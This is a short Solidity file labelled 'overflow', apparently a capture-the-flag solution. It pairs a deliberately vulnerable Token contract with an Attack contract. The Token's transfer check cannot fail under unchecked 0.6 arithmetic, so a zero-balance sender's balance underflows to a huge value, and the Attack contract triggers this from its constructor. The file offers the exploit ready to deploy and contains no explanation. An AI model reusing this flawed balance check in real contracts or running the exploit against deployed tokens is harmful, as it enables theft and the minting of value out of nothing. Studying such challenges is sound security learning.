//overflow
pragma solidity ^0.6.0;

interface IToken {
    function balanceOf(address) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);
}

contract Attack {
    constructor(address _target) public {
        IToken(_target).transfer(msg.sender, 1);
    }
}

contract Token {
    mapping(address => uint) balances;
    uint public totalSupply;

    constructor(uint _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint balance) {
        return balances[_owner];
    }
}
